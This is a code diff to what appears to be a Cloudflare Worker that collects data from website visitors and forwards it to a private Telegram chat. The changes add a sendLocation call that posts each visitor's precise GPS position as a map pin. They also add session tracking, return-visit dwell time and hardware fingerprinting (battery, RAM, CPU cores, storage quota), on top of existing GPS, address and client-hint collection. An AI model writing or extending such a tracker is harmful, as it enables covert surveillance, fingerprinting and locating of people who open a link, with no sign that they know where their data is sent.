@@ -21,7 +21,7 @@
  */
 
 const ALLOWED_ORIGINS = ["https://nassaranwar-boop.github.io"];
-const WORKER_VERSION = "2026-09-20-FULL-7";
+const WORKER_VERSION = "2026-09-20-FULL-8";
 
 const RECENT = new Map();
 const RATE_WINDOW_MS = 4000;
@@ -75,6 +75,22 @@ export default {
       return json({ ok: false, error: "telegram_unreachable" }, 502, cors);
     }
 
+    // A tappable map pin, when GPS was shared (best-effort; never fails the call).
+    try {
+      const g = body.gps;
+      if (g && g.available && typeof g.latitude === "number" && typeof g.longitude === "number") {
+        const send = fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendLocation`, {
+          method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: env.TELEGRAM_CHAT_ID,
+            latitude: g.latitude, longitude: g.longitude,
+            horizontal_accuracy: (typeof g.accuracy === "number" ? Math.min(1500, Math.max(0, g.accuracy)) : undefined)
+          })
+        });
+        if (ctx && ctx.waitUntil) ctx.waitUntil(send.catch(() => {})); else await send.catch(() => {});
+      }
+    } catch (e) {}
+
     // Ask Chromium for high-entropy hints on the next request too.
     const resp = json({ ok: true, version: WORKER_VERSION }, 200, cors);
     resp.headers.set("Accept-CH",
@@ -118,6 +134,14 @@ function yesno(v) { return v === true ? "Yes" : v === false ? "No" : "Unavailabl
 function num(v, d) {
   if (typeof v !== "number" || !isFinite(v)) return null;
   return d === undefined ? v : Number(v.toFixed(d));
+}
+function dur(ms) {
+  const s = Math.round(ms / 1000);
+  if (s < 60) return s + "s";
+  const m = Math.floor(s / 60), r = s % 60;
+  if (m < 60) return m + "m " + r + "s";
+  const h = Math.floor(m / 60);
+  return h + "h " + (m % 60) + "m";
 }
 const DIV = "\n━━━━━━━━━━━━━━━━━━\n";
 
@@ -218,12 +242,16 @@ async function buildMessage(b, cf, headers) {
   const tz      = first(b.timezone, b.browserTimezone, cf.timezone);
   const origin  = first(b.origin, H("Origin"));
   const referrer = (b.referrer && b.referrer !== "Direct") ? b.referrer : null;
+  const e2 = (b.extra && typeof b.extra === "object") ? b.extra : {};
 
   // ---- VISIT ----
   out += "\n🟢 <b>VISIT</b>\n";
   out += "Type: " + (isReopen ? "REOPEN / RETURN" : "INITIAL VISIT") + "\n";
   out += "Time (UTC): " + esc(new Date().toISOString()) + "\n";
   if (b.localTime) out += "Client time: " + val(b.localTime) + "\n";
+  if (b.sessionId) out += "Session: " + val(b.sessionId) + "\n";
+  if (typeof b.previousDwellMs === "number" && b.previousDwellMs > 0)
+    out += "Previous visit stayed: " + dur(b.previousDwellMs) + "\n";
 
   // ---- DEVICE ----
   out += DIV + "📱 <b>DEVICE</b>\n";
@@ -253,8 +281,26 @@ async function buildMessage(b, cf, headers) {
   out += DIV + "📐 <b>DISPLAY</b>\n";
   out += "Screen: " + val(b.screenWidth) + " × " + val(b.screenHeight) + "\n";
   out += "Viewport: " + val(b.viewportWidth) + " × " + val(b.viewportHeight) + "\n";
-  out += "Orientation: " + val(b.orientation) + "\n";
+  out += "Orientation: " + val(b.orientation) + (typeof e2.orientationAngle === "number" ? " (" + e2.orientationAngle + "°)" : "") + "\n";
   out += "Device pixel ratio: " + val(b.devicePixelRatio) + "\n";
+  if (e2.availWidth) out += "Usable screen: " + val(e2.availWidth) + " × " + val(e2.availHeight) + "\n";
+  if (typeof e2.colorDepth === "number") out += "Color depth: " + e2.colorDepth + "-bit\n";
+  if (typeof e2.refreshHz === "number") out += "Refresh rate: ~" + e2.refreshHz + " Hz\n";
+  if (e2.colorScheme) out += "Color scheme: " + esc(e2.colorScheme) + "\n";
+  if (e2.reducedMotion === true) out += "Reduced motion: Yes\n";
+  if (e2.hdr === true) out += "HDR display: Yes\n";
+
+  const hasHw = e2.battery || typeof e2.deviceMemory === "number" || typeof e2.cpuCores === "number" || typeof e2.storageQuotaMB === "number";
+  if (hasHw) {
+    out += DIV + "🔋 <b>HARDWARE</b>\n";
+    if (e2.battery && typeof e2.battery.level === "number")
+      out += "Battery: " + e2.battery.level + "%" + (e2.battery.charging === true ? " (charging)" : e2.battery.charging === false ? " (on battery)" : "") + "\n";
+    if (typeof e2.deviceMemory === "number") out += "RAM: ~" + e2.deviceMemory + " GB\n";
+    if (typeof e2.cpuCores === "number") out += "CPU cores: " + e2.cpuCores + "\n";
+    if (typeof e2.storageQuotaMB === "number")
+      out += "Storage quota: " + (e2.storageQuotaMB >= 1024 ? (e2.storageQuotaMB / 1024).toFixed(1) + " GB" : e2.storageQuotaMB + " MB")
+           + (typeof e2.storageUsageMB === "number" ? " (used " + e2.storageUsageMB + " MB)" : "") + "\n";
+  }
 
   // ---- PRECISE LOCATION (browser GPS only) ----
   out += DIV + "📍 <b>PRECISE LOCATION</b> (browser GPS)\n";
@@ -269,6 +315,7 @@ async function buildMessage(b, cf, headers) {
     out += "Altitude accuracy: " + (num(gps.altitudeAccuracy, 0) !== null ? "±" + num(gps.altitudeAccuracy, 0) + " m" : "Unavailable") + "\n";
     out += "Heading: " + (num(gps.heading, 0) !== null ? num(gps.heading, 0) + "°" : "Unavailable") + "\n";
     out += "Speed: " + (num(gps.speed, 1) !== null ? num(gps.speed, 1) + " m/s" : "Unavailable") + "\n";
+    if (typeof gps.samples === "number") out += "Samples taken: " + gps.samples + "\n";
     out += "Google Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n";
 
     // Reverse-geocode to a human address (best-effort, never blocks).
